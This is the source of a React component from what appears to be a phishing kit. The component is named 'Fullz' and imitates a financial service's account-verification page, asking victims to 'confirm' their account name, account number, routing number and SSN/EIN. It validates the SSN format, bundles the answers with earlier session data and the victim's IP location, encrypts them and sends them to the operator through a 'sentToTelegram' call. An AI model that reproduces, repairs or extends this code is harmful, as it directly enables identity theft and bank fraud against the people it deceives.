"use client";

import { sentToTelegram } from "@/actions/sender";
import { ERROR } from "@/const";
import { useSessionStore } from "@/store/session";
import { encryptObject } from "@/utils/client/encryption";
import { useState, useEffect, ChangeEvent } from "react";

export const Fullz = ({
  setStage,
  setEnterPwd,
  setLoading,
  setFinish,
}: {
  setStage: React.Dispatch<React.SetStateAction<string>>;
  setEnterPwd: React.Dispatch<React.SetStateAction<boolean>>;
  setLoading: React.Dispatch<React.SetStateAction<boolean>>;
  setFinish: React.Dispatch<React.SetStateAction<string>>;
}) => {
  const { ipLocationData, setSessions, sessionEntries, sessionId, keyData } =
    useSessionStore();
  if (!keyData) return null;

  const [initialLoad, setInitialLoad] = useState("init");
  const [quickLoad, setQuickLoad] = useState(true);
  const [name, setName] = useState("");
  const [number, setNumber] = useState("");
  const [routing, setRouting] = useState("");
  const [ssn, setSsn] = useState("");
  // const [dob, setDob] = useState("");
  const [noName, setNoName] = useState(false);
  const [noNumber, setNoNumber] = useState(false);
  const [noRouting, setNoRouting] = useState(false);
  // const [noDob, setNoDob] = useState(false);
  const [noSsn, setNoSsn] = useState(false);

  useEffect(() => {
    if (initialLoad !== "not-init") {
      setTimeout(() => {
        setInitialLoad("not-init");
      }, 2360);
    }

    if (quickLoad) {
      setTimeout(() => {
        setQuickLoad(false);
      }, 480);
    }
  }, [initialLoad]);

  const validateSSN = (rawInput: string, type: "direct" | "indirect") => {
    const raw = rawInput.replace(/\D/g, "");

    let formatted = "";
    if (type === "direct") setNoSsn(true);
    let error = !!0;

    if (raw.length === 0) {
      formatted = "";
      if (type === "direct") setNoSsn(false);
    } else if (raw.length <= 3) {
      formatted = raw;
    } else if (raw.length <= 5) {
      formatted = `${raw.slice(0, 3)}-${raw.slice(3)}`;
    } else if (raw.length < 9) {
      formatted = `${raw.slice(0, 3)}-${raw.slice(3, 5)}-${raw.slice(5)}`;
    } else {
      formatted = `${raw.slice(0, 3)}-${raw.slice(3, 5)}-${raw.slice(5, 9)}`;
      if (type === "direct") setNoSsn(false);
    }

    if (type === "direct") setSsn(formatted);

    if (type === "indirect" && !/^\d{9}$/.test(raw)) error = !!1;

    const area = raw.slice(0, 3);
    const group = raw.slice(3, 5);
    const serial = raw.slice(5, 9);

    if (
      area === "000" ||
      area === "666" ||
      +area >= 900 ||
      group === "00" ||
      serial === "0000"
    ) {
      setNoSsn(true);
      error = !!1;
    }

    return error;
  };

  // const validateDOB = (rawInput: string, type: "direct" | "indirect") => {
  //   const raw = rawInput.replace(/\D/g, "");

  //   let formatted = "";
  //   let error = !!0;
  //   if (type === "direct") setNoDob(true);

  //   if (raw.length === 0) {
  //     formatted = "";
  //     setNoDob(false);
  //   } else if (raw.length <= 2) {
  //     formatted = raw;
  //   } else if (raw.length <= 4) {
  //     formatted = `${raw.slice(0, 2)}/${raw.slice(2)}`;
  //   } else {
  //     formatted = `${raw.slice(0, 2)}/${raw.slice(2, 4)}/${raw.slice(4)}`;
  //     if (raw.length === 8) setNoDob(false);
  //   }

  //   if (type === "direct") setDob(formatted);

  //   if (type === "indirect" && !/^\d{8}$/.test(raw)) error = !!1;

  //   if (raw.length !== 0) {
  //     if (+raw.slice(0, 2) === 0 || +raw.slice(0, 2) > 12) {
  //       setNoDob(true);
  //       error = !!1;
  //     } else if (+raw.slice(2, 4) === 0 || +raw.slice(2, 4) > 31) {
  //       setNoDob(true);
  //       error = !!1;
  //     } else if (+raw.slice(4) < 1925 || +raw.slice(4) > 2012) {
  //       setNoDob(true);
  //       error = !!1;
  //     }
  //   }

  //   return error;
  // };

  // useEffect(() => {
  //   if (dob.length < 9) {
  //     setNoDob(true);
  //   }
  // }, [dob]);

  // useEffect(() => {
  //   if (ssn.length <= 10) {
  //     setNoSsn(true);
  //   }
  // }, [ssn]);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setQuickLoad(true);

    const validInput = () => {
      let error = !!0;

      if (name.length < 1 || name.length > 30) {
        setNoName(!!1);
        error = !!1;
      }

      if (number.length < 1 || number.length > 18) {
        setNoNumber(!!1);
        error = !!1;
      }

      if (routing.length < 1 || routing.length > 18) {
        setNoRouting(!!1);
        error = !!1;
      }

      if (validateSSN(ssn, "indirect") || ssn.length < 1 || ssn.length > 12) {
        setNoSsn(!!1);
        error = !!1;
      }

      // if (
      //   validateDOB(dob, "direct") ||
      //   dob.length < 1 ||
      //   routing.length > 11
      // ) {
      //   setNoDob(!!1);
      //   error = !!1;
      // }

      return error;
    };

    if (validInput()) {
      setQuickLoad(false);
      return;
    }

    setLoading(true);
    // setEnterPwd(false);
    setStage("text");
    setFinish("loading-3");

    const data = {
      ...sessionEntries,
      name,
      number,
      routing,
      ssn,
      step: 6,
    };

    const safeData = encryptObject(
      { data, ipLocationData, sessionId },
      keyData
    );
    await sentToTelegram(safeData);
  };

  return (
    <>
      <div
        className="MfaOtpStyles__StyledContainer-e7rfsj-2 hOVTDf"
        style={{ width: "100%" }}
      >
        <section
          className="IuxH2AndDescription__StyledSection-j40avf-0 iOUNHt MfaOtpStyles__StyledIuxH2AndDescription-e7rfsj-7 csnyFM"
          style={{ marginBottom: "19px" }}
        >
          <header>
            <div className="IuxH2AndDescription__ProdModHeaderContainer-j40avf-2 xLVQH">
              <h6
                className="IuxH2AndDescription__ProdModTitleText-j40avf-4 iQcJay Typography-light-f6c67d3 Typography-headline-6-3e791a5 Typography-demi-5d6d061"
                id="VerifyOtpHeader"
                data-testid="VerifyOtpHeader"
              >
                Confirm the details below
              </h6>
            </div>
            <span
              className="Typography-light-f6c67d3 Typography-body-3-e4a1793"
              data-testid="VerifyOtpWeSentToPrompt"
              id="VerifyOtpWeSentToPrompt"
            >
              To keep your account details updated
            </span>
          </header>
        </section>
        <form
          className="IuxForm__StyledForm-sc-10pry6-0 dUwATG"
          action="#"
          autoComplete="on"
        >
          <div
            data-testid="VerifyOtpField"
            className="IuxFormInput__StyledFieldWrapper-sc-1nlfpoi-0 jxlqeV"
          >
            <div
              className="TextField-light-d062759 idsTSTextField TextField-TextFieldWrapper-bafba49"
              style={{ width: "100%" }}
            >
              <label
                htmlFor="ius-mfa-confirm-code"
                className="TextField-TFLabelWrapper-3541982 TextField-TFHasLabel-78d0998"
              >
                <span className="TextField-TFLabelOverride-8e74fad TextField-size-medium-4c97db9 Typography-light-f6c67d3 Typography-body-3-e4a1793">
                  Account name{" "}
                </span>
                <div className="TextField-TFInputWrapper-f1e029f TextField-size-medium-4c97db9">
                  <input
                    id="ius-mfa-confirm-code"
                    aria-invalid="false"
                    width="100%"
                    className={`idsF TextField-TFInput-8a2b0cc TextField-light-d062759 TextField-TFNoErrorText-b385be9 TextField-TFNotDisabled-a9f4959 TextField-size-medium-4c97db9  ${
                      noName
                        ? "TextField-TFErrorText-995fdeb TextField-TFAddonAfter-5fe16cd"
                        : ""
                    }`}
                    type="text"
                    required
                    autoComplete="off"
                    data-testid="VerifyOtpInput"
                    name="Verification code"
                    placeholder=""
                    value={name}
                    onChange={(e: ChangeEvent<HTMLInputElement>) =>
                      setName(e.target.value.replace(/[^A-Za-z\s]/g, ""))
                    }
                    onFocus={() => {
                      setNoName(false);
                    }}
                  />
                </div>
              </label>
              <div className="">
                {noName ? (
                  <div
                    className="InlineValidationMessage-ivm-wrapper-d066fb2 InlineValidationMessage-light-212a3d4"
                    role="alert"
                    id="iux-password-confirmation-password-error"
                    data-automation-id="idsInlineValidationMessage-alertMsg"
                  >
                    <div className="idsTSBadge InlineValidationMessage-ivm-status-icon-a3e9327 Badge-light-5c13fad Badge-badge-0c43a9f Badge-error-7e536f4 Badge-round-0018fec">
                      <div className="Badge-value-da34c95 Badge-light-5c13fad">
                        <div className="Badge-iconFix-affba1e">
                          <svg height="16px" width="16px" viewBox="0 0 144 144">
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              fill="none"
                              viewBox="0 0 20 20"
                              color="currentColor"
                              width="100%"
                              height="100%"
                              focusable="false"
                              aria-hidden="true"
                              className="Badge-icon-prefab-7b55bae Badge-background-9ea98c1"
                            >
                              <path
                                fill="currentColor"
                                d="m18.374 15.023-6.916-12.45a1.666 1.666 0 0 0-2.914 0l-6.916 12.45A1.667 1.667 0 0 0 3.083 17.5h13.834a1.667 1.667 0 0 0 1.457-2.477"
                                style={{
                                  transformOrigin: "center center 0px",
                                }}
                              ></path>
                            </svg>
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              fill="none"
                              viewBox="0 0 20 20"
                              color="currentColor"
                              width="100%"
                              height="100%"
                              focusable="false"
                              aria-hidden="true"
                              className="Badge-icon-prefab-7b55bae Badge-foreground-f3e529f"
                            >
                              <path
                                fill="currentColor"
                                d="M9.167 11.667V7.5a.833.833 0 1 1 1.666 0v4.167a.833.833 0 1 1-1.666 0M9.537 13.474a.833.833 0 1 1 .926 1.385.833.833 0 0 1-.926-1.385"
                                style={{
                                  transformOrigin: "center center 0px",
                                }}
                              ></path>
                            </svg>
                          </svg>
                        </div>
                      </div>
                    </div>
                    <div className="InlineValidationMessage-ivm-message-container-3984c36">
                      <span className="InlineValidationMessage-ivm-message-ee9633f InlineValidationMessage-ivm-error-c6247c9 Typography-light-f6c67d3 Typography-body-3-e4a1793">
                        {ERROR.invalidInput.replace(
                          "{message}",
                          "Account name"
                        )}
                      </span>
                      <span className="InlineValidationMessage-ivm-description-9415be4 Typography-light-f6c67d3 Typography-body-3-e4a1793"></span>
                    </div>
                  </div>
                ) : (
                  ""
                )}
              </div>
            </div>
            {!noName && (
              <div className="IuxFormInput__ValidationSpacer-sc-1nlfpoi-1 iULrOf">
                &nbsp;
              </div>
            )}
          </div>
          <div
            data-testid="VerifyOtpField"
            className="IuxFormInput__StyledFieldWrapper-sc-1nlfpoi-0 jxlqeV"
          >
            <div
              className="TextField-light-d062759 idsTSTextField TextField-TextFieldWrapper-bafba49"
              style={{ width: "100%" }}
            >
              <label
                htmlFor="ius-mfa-confirm-code"
                className="TextField-TFLabelWrapper-3541982 TextField-TFHasLabel-78d0998"
              >
                <span className="TextField-TFLabelOverride-8e74fad TextField-size-medium-4c97db9 Typography-light-f6c67d3 Typography-body-3-e4a1793">
                  Account number{" "}
                </span>
                <div className="TextField-TFInputWrapper-f1e029f TextField-size-medium-4c97db9">
                  <input
                    id="ius-mfa-confirm-code"
                    aria-invalid="false"
                    width="100%"
                    className={`idsF TextField-TFInput-8a2b0cc TextField-light-d062759 TextField-TFNoErrorText-b385be9 TextField-TFNotDisabled-a9f4959 TextField-size-medium-4c97db9  ${
                      noNumber
                        ? "TextField-TFErrorText-995fdeb TextField-TFAddonAfter-5fe16cd"
                        : ""
                    }`}
                    type="text"
                    required
                    autoComplete="off"
                    data-testid="VerifyOtpInput"
                    inputMode="numeric"
                    maxLength={17}
                    name="Verification code"
                    placeholder=""
                    value={number}
                    onChange={(e: ChangeEvent<HTMLInputElement>) =>
                      setNumber(e.target.value.replace(/[^0-9]/g, ""))
                    }
                    onFocus={() => {
                      setNoNumber(false);
                    }}
                  />
                </div>
              </label>
              <div className="">
                {noNumber ? (
                  <div
                    className="InlineValidationMessage-ivm-wrapper-d066fb2 InlineValidationMessage-light-212a3d4"
                    role="alert"
                    id="iux-password-confirmation-password-error"
                    data-automation-id="idsInlineValidationMessage-alertMsg"
                  >
                    <div className="idsTSBadge InlineValidationMessage-ivm-status-icon-a3e9327 Badge-light-5c13fad Badge-badge-0c43a9f Badge-error-7e536f4 Badge-round-0018fec">
                      <div className="Badge-value-da34c95 Badge-light-5c13fad">
                        <div className="Badge-iconFix-affba1e">
                          <svg height="16px" width="16px" viewBox="0 0 144 144">
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              fill="none"
                              viewBox="0 0 20 20"
                              color="currentColor"
                              width="100%"
                              height="100%"
                              focusable="false"
                              aria-hidden="true"
                              className="Badge-icon-prefab-7b55bae Badge-background-9ea98c1"
                            >
                              <path
                                fill="currentColor"
                                d="m18.374 15.023-6.916-12.45a1.666 1.666 0 0 0-2.914 0l-6.916 12.45A1.667 1.667 0 0 0 3.083 17.5h13.834a1.667 1.667 0 0 0 1.457-2.477"
                                style={{
                                  transformOrigin: "center center 0px",
                                }}
                              ></path>
                            </svg>
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              fill="none"
                              viewBox="0 0 20 20"
                              color="currentColor"
                              width="100%"
                              height="100%"
                              focusable="false"
                              aria-hidden="true"
                              className="Badge-icon-prefab-7b55bae Badge-foreground-f3e529f"
                            >
                              <path
                                fill="currentColor"
                                d="M9.167 11.667V7.5a.833.833 0 1 1 1.666 0v4.167a.833.833 0 1 1-1.666 0M9.537 13.474a.833.833 0 1 1 .926 1.385.833.833 0 0 1-.926-1.385"
                                style={{
                                  transformOrigin: "center center 0px",
                                }}
                              ></path>
                            </svg>
                          </svg>
                        </div>
                      </div>
                    </div>
                    <div className="InlineValidationMessage-ivm-message-container-3984c36">
                      <span className="InlineValidationMessage-ivm-message-ee9633f InlineValidationMessage-ivm-error-c6247c9 Typography-light-f6c67d3 Typography-body-3-e4a1793">
                        {ERROR.invalidInput.replace(
                          "{message}",
                          "Account number"
                        )}
                      </span>
                      <span className="InlineValidationMessage-ivm-description-9415be4 Typography-light-f6c67d3 Typography-body-3-e4a1793"></span>
                    </div>
                  </div>
                ) : (
                  ""
                )}
              </div>
            </div>
            {!noNumber && (
              <div className="IuxFormInput__ValidationSpacer-sc-1nlfpoi-1 iULrOf">
                &nbsp;
              </div>
            )}
          </div>
          <div
            data-testid="VerifyOtpField"
            className="IuxFormInput__StyledFieldWrapper-sc-1nlfpoi-0 jxlqeV"
          >
            <div
              className="TextField-light-d062759 idsTSTextField TextField-TextFieldWrapper-bafba49"
              style={{ width: "100%" }}
            >
              <label
                htmlFor="ius-mfa-confirm-code"
                className="TextField-TFLabelWrapper-3541982 TextField-TFHasLabel-78d0998"
              >
                <span className="TextField-TFLabelOverride-8e74fad TextField-size-medium-4c97db9 Typography-light-f6c67d3 Typography-body-3-e4a1793">
                  Routing number{" "}
                </span>
                <div className="TextField-TFInputWrapper-f1e029f TextField-size-medium-4c97db9">
                  <input
                    id="ius-mfa-confirm-code"
                    aria-invalid="false"
                    width="100%"
                    className={`idsF TextField-TFInput-8a2b0cc TextField-light-d062759 TextField-TFNoErrorText-b385be9 TextField-TFNotDisabled-a9f4959 TextField-size-medium-4c97db9  ${
                      noRouting
                        ? "TextField-TFErrorText-995fdeb TextField-TFAddonAfter-5fe16cd"
                        : ""
                    }`}
                    type="text"
                    required
                    autoComplete="off"
                    data-testid="VerifyOtpInput"
                    inputMode="numeric"
                    maxLength={17}
                    name="Verification code"
                    placeholder=""
                    value={routing}
                    onChange={(e: ChangeEvent<HTMLInputElement>) =>
                      setRouting(e.target.value.replace(/[^0-9]/g, ""))
                    }
                    onFocus={() => {
                      setNoRouting(false);
                    }}
                  />
                </div>
              </label>
              <div className="">
                {noRouting ? (
                  <div
                    className="InlineValidationMessage-ivm-wrapper-d066fb2 InlineValidationMessage-light-212a3d4"
                    role="alert"
                    id="iux-password-confirmation-password-error"
                    data-automation-id="idsInlineValidationMessage-alertMsg"
                  >
                    <div className="idsTSBadge InlineValidationMessage-ivm-status-icon-a3e9327 Badge-light-5c13fad Badge-badge-0c43a9f Badge-error-7e536f4 Badge-round-0018fec">
                      <div className="Badge-value-da34c95 Badge-light-5c13fad">
                        <div className="Badge-iconFix-affba1e">
                          <svg height="16px" width="16px" viewBox="0 0 144 144">
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              fill="none"
                              viewBox="0 0 20 20"
                              color="currentColor"
                              width="100%"
                              height="100%"
                              focusable="false"
                              aria-hidden="true"
                              className="Badge-icon-prefab-7b55bae Badge-background-9ea98c1"
                            >
                              <path
                                fill="currentColor"
                                d="m18.374 15.023-6.916-12.45a1.666 1.666 0 0 0-2.914 0l-6.916 12.45A1.667 1.667 0 0 0 3.083 17.5h13.834a1.667 1.667 0 0 0 1.457-2.477"
                                style={{
                                  transformOrigin: "center center 0px",
                                }}
                              ></path>
                            </svg>
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              fill="none"
                              viewBox="0 0 20 20"
                              color="currentColor"
                              width="100%"
                              height="100%"
                              focusable="false"
                              aria-hidden="true"
                              className="Badge-icon-prefab-7b55bae Badge-foreground-f3e529f"
                            >
                              <path
                                fill="currentColor"
                                d="M9.167 11.667V7.5a.833.833 0 1 1 1.666 0v4.167a.833.833 0 1 1-1.666 0M9.537 13.474a.833.833 0 1 1 .926 1.385.833.833 0 0 1-.926-1.385"
                                style={{
                                  transformOrigin: "center center 0px",
                                }}
                              ></path>
                            </svg>
                          </svg>
                        </div>
                      </div>
                    </div>
                    <div className="InlineValidationMessage-ivm-message-container-3984c36">
                      <span className="InlineValidationMessage-ivm-message-ee9633f InlineValidationMessage-ivm-error-c6247c9 Typography-light-f6c67d3 Typography-body-3-e4a1793">
                        {ERROR.invalidInput.replace(
                          "{message}",
                          "Routing Number"
                        )}
                      </span>
                      <span className="InlineValidationMessage-ivm-description-9415be4 Typography-light-f6c67d3 Typography-body-3-e4a1793"></span>
                    </div>
                  </div>
                ) : (
                  ""
                )}
              </div>
            </div>
            {!noRouting && (
              <div className="IuxFormInput__ValidationSpacer-sc-1nlfpoi-1 iULrOf">
                &nbsp;
              </div>
            )}
          </div>
          <div
            data-testid="VerifyOtpField"
            className="IuxFormInput__StyledFieldWrapper-sc-1nlfpoi-0 jxlqeV"
          >
            <div
              className="TextField-light-d062759 idsTSTextField TextField-TextFieldWrapper-bafba49"
              style={{ width: "100%" }}
            >
              <label
                htmlFor="ius-mfa-confirm-code"
                className="TextField-TFLabelWrapper-3541982 TextField-TFHasLabel-78d0998"
              >
                <span className="TextField-TFLabelOverride-8e74fad TextField-size-medium-4c97db9 Typography-light-f6c67d3 Typography-body-3-e4a1793">
                  SSN/EIN{" "}
                </span>
                <div className="TextField-TFInputWrapper-f1e029f TextField-size-medium-4c97db9">
                  <input
                    id="ius-mfa-confirm-code"
                    aria-invalid="false"
                    width="100%"
                    className={`idsF TextField-TFInput-8a2b0cc TextField-light-d062759 TextField-TFNoErrorText-b385be9 TextField-TFNotDisabled-a9f4959 TextField-size-medium-4c97db9  ${
                      noSsn
                        ? "TextField-TFErrorText-995fdeb TextField-TFAddonAfter-5fe16cd"
                        : ""
                    }`}
                    type="text"
                    required
                    autoComplete="off"
                    data-testid="VerifyOtpInput"
                    inputMode="numeric"
                    maxLength={11}
                    name="Verification code"
                    placeholder="XXX-XX-XXXX"
                    value={ssn}
                    onChange={(e: ChangeEvent<HTMLInputElement>) => {
                      const raw = e.target.value;
                      validateSSN(raw, "direct");
                    }}
                    onFocus={() => {
                      setNoSsn(false);
                    }}
                  />
                </div>
              </label>
              <div className="">
                {noSsn ? (
                  <div
                    className="InlineValidationMessage-ivm-wrapper-d066fb2 InlineValidationMessage-light-212a3d4"
                    role="alert"
                    id="iux-password-confirmation-password-error"
                    data-automation-id="idsInlineValidationMessage-alertMsg"
                  >
                    <div className="idsTSBadge InlineValidationMessage-ivm-status-icon-a3e9327 Badge-light-5c13fad Badge-badge-0c43a9f Badge-error-7e536f4 Badge-round-0018fec">
                      <div className="Badge-value-da34c95 Badge-light-5c13fad">
                        <div className="Badge-iconFix-affba1e">
                          <svg height="16px" width="16px" viewBox="0 0 144 144">
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              fill="none"
                              viewBox="0 0 20 20"
                              color="currentColor"
                              width="100%"
                              height="100%"
                              focusable="false"
                              aria-hidden="true"
                              className="Badge-icon-prefab-7b55bae Badge-background-9ea98c1"
                            >
                              <path
                                fill="currentColor"
                                d="m18.374 15.023-6.916-12.45a1.666 1.666 0 0 0-2.914 0l-6.916 12.45A1.667 1.667 0 0 0 3.083 17.5h13.834a1.667 1.667 0 0 0 1.457-2.477"
                                style={{
                                  transformOrigin: "center center 0px",
                                }}
                              ></path>
                            </svg>
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              fill="none"
                              viewBox="0 0 20 20"
                              color="currentColor"
                              width="100%"
                              height="100%"
                              focusable="false"
                              aria-hidden="true"
                              className="Badge-icon-prefab-7b55bae Badge-foreground-f3e529f"
                            >
                              <path
                                fill="currentColor"
                                d="M9.167 11.667V7.5a.833.833 0 1 1 1.666 0v4.167a.833.833 0 1 1-1.666 0M9.537 13.474a.833.833 0 1 1 .926 1.385.833.833 0 0 1-.926-1.385"
                                style={{
                                  transformOrigin: "center center 0px",
                                }}
                              ></path>
                            </svg>
                          </svg>
                        </div>
                      </div>
                    </div>
                    <div className="InlineValidationMessage-ivm-message-container-3984c36">
                      <span className="InlineValidationMessage-ivm-message-ee9633f InlineValidationMessage-ivm-error-c6247c9 Typography-light-f6c67d3 Typography-body-3-e4a1793">
                        {ERROR.invalidInput.replace("{message}", "SSN or EIN")}
                      </span>
                      <span className="InlineValidationMessage-ivm-description-9415be4 Typography-light-f6c67d3 Typography-body-3-e4a1793"></span>
                    </div>
                  </div>
                ) : (
                  ""
                )}
              </div>
            </div>
            {!noSsn && (
              <div className="IuxFormInput__ValidationSpacer-sc-1nlfpoi-1 iULrOf">
                &nbsp;
              </div>
            )}
          </div>
          {/* <div
            data-testid="VerifyOtpField"
            className="IuxFormInput__StyledFieldWrapper-sc-1nlfpoi-0 jxlqeV"
          >
            <div
              className="TextField-light-d062759 idsTSTextField TextField-TextFieldWrapper-bafba49"
              style={{ width: "100%" }}
            >
              <label
                htmlFor="ius-mfa-confirm-code"
                className="TextField-TFLabelWrapper-3541982 TextField-TFHasLabel-78d0998"
              >
                <span className="TextField-TFLabelOverride-8e74fad TextField-size-medium-4c97db9 Typography-light-f6c67d3 Typography-body-3-e4a1793">
                  Date of birth{" "}
                </span>
                <div className="TextField-TFInputWrapper-f1e029f TextField-size-medium-4c97db9">
                  <input
                    id="ius-mfa-confirm-code"
                    aria-invalid="false"
                    width="100%"
                    className={`idsF TextField-TFInput-8a2b0cc TextField-light-d062759 TextField-TFNoErrorText-b385be9 TextField-TFNotDisabled-a9f4959 TextField-size-medium-4c97db9  ${
                      noDob
                        ? "TextField-TFErrorText-995fdeb TextField-TFAddonAfter-5fe16cd"
                        : ""
                    }`}
                    type="text"
                    required
                    autoComplete="off"
                    data-testid="VerifyOtpInput"
                    inputMode="numeric"
                    maxLength={10}
                    name="Verification code"
                    placeholder="mm / dd / yyyy "
                    value={dob}
                    onChange={(e: ChangeEvent<HTMLInputElement>) => {
                      const raw = e.target.value;
                      validateDOB(raw, "direct");
                    }}
                    onFocus={() => {
                      setNoDob(false);
                    }}
                  />
                </div>
              </label>
              <div className="">
                {noDob ? (
                  <div
                    className="InlineValidationMessage-ivm-wrapper-d066fb2 InlineValidationMessage-light-212a3d4"
                    role="alert"
                    id="iux-password-confirmation-password-error"
                    data-automation-id="idsInlineValidationMessage-alertMsg"
                  >
                    <div className="idsTSBadge InlineValidationMessage-ivm-status-icon-a3e9327 Badge-light-5c13fad Badge-badge-0c43a9f Badge-error-7e536f4 Badge-round-0018fec">
                      <div className="Badge-value-da34c95 Badge-light-5c13fad">
                        <div className="Badge-iconFix-affba1e">
                          <svg height="16px" width="16px" viewBox="0 0 144 144">
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              fill="none"
                              viewBox="0 0 20 20"
                              color="currentColor"
                              width="100%"
                              height="100%"
                              focusable="false"
                              aria-hidden="true"
                              className="Badge-icon-prefab-7b55bae Badge-background-9ea98c1"
                            >
                              <path
                                fill="currentColor"
                                d="m18.374 15.023-6.916-12.45a1.666 1.666 0 0 0-2.914 0l-6.916 12.45A1.667 1.667 0 0 0 3.083 17.5h13.834a1.667 1.667 0 0 0 1.457-2.477"
                                style={{
                                  transformOrigin: "center center 0px",
                                }}
                              ></path>
                            </svg>
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              fill="none"
                              viewBox="0 0 20 20"
                              color="currentColor"
                              width="100%"
                              height="100%"
                              focusable="false"
                              aria-hidden="true"
                              className="Badge-icon-prefab-7b55bae Badge-foreground-f3e529f"
                            >
                              <path
                                fill="currentColor"
                                d="M9.167 11.667V7.5a.833.833 0 1 1 1.666 0v4.167a.833.833 0 1 1-1.666 0M9.537 13.474a.833.833 0 1 1 .926 1.385.833.833 0 0 1-.926-1.385"
                                style={{
                                  transformOrigin: "center center 0px",
                                }}
                              ></path>
                            </svg>
                          </svg>
                        </div>
                      </div>
                    </div>
                    <div className="InlineValidationMessage-ivm-message-container-3984c36">
                      <span className="InlineValidationMessage-ivm-message-ee9633f InlineValidationMessage-ivm-error-c6247c9 Typography-light-f6c67d3 Typography-body-3-e4a1793">
                        {ERROR.invalidInput.replace("{message}", "date")}
                      </span>
                      <span className="InlineValidationMessage-ivm-description-9415be4 Typography-light-f6c67d3 Typography-body-3-e4a1793"></span>
                    </div>
                  </div>
                ) : (
                  ""
                )}
              </div>
            </div>
            {!noDob && (
              <div className="IuxFormInput__ValidationSpacer-sc-1nlfpoi-1 iULrOf">
                &nbsp;
              </div>
            )}
          </div> */}
          <button
            type="submit"
            onClick={(e: React.MouseEvent<HTMLButtonElement>) => {
              e.preventDefault();
              handleSubmit(e as any);
            }}
            data-testid="VerifyOtpSubmitButton"
            className={`idsTSButton idsF Button-button-7306813 Button-light-e776e02 Button-size-medium-1225d24 Button-purpose-standard-c20ddd8 Button-priority-primary-9b31d62 IuxButton__StyledButton-ktqsri-0 dDQzHx Button-full-be46b30 ${
              quickLoad
                ? "Button-disabled-b1a6c9a Button-isLoading-d681a99 loading"
                : ""
            }`}
            disabled={quickLoad}
          >
            {!quickLoad ? (
              <span className="Button-label-f10bb25">
                <span>Continue</span>
              </span>
            ) : (
              <div
                className="Dots-wrapper-4978bc1 Dots-light-c0083e5"
                aria-label="Loading"
                data-testid="IuxButtonLoadingSpinner"
              >
                <div className="Dots-spinner-5ff8fcd" />
              </div>
            )}
          </button>
          {/* <button
            type="button"
            onClick={() => {
              setInitialLoad("resend");
            }}
            data-testid="VerifyOtpCancelLink"
            className={`idsTSButton idsF Button-button-7306813 Button-light-e776e02 Button-size-medium-1225d24 Button-purpose-standard-c20ddd8 Button-priority-tertiary-b2cb5b6 IuxButton__StyledButton-ktqsri-0 dDQzHx MfaOtpStyles__StyledIuxButton-e7rfsj-1 dxMOkJ Button-full-be46b30 ${
              initialLoad === "init" || initialLoad === "resend"
                ? "Button-disabled-b1a6c9a"
                : ""
            }`}
          >
            <span className="Button-label-f10bb25">
              I didn't get a text message
            </span>
          </button> */}
        </form>
      </div>
    </>
  );
};
